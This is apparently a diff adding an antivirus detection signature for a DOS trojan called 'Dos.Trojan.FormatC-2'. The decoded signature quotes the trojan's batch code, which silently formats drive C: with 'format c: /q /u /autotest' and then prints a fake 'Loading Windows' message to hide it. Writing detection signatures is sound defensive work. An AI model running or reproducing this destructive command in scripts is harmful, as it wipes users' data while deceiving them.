@@ -1,0 +1,8 @@
+VIRUS NAME: Dos.Trojan.FormatC-2
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ers your system . . . 
+for %%a in ( c ) do call format %%a: /q /u /autotest  
+cls 
+echo Loading Windows,
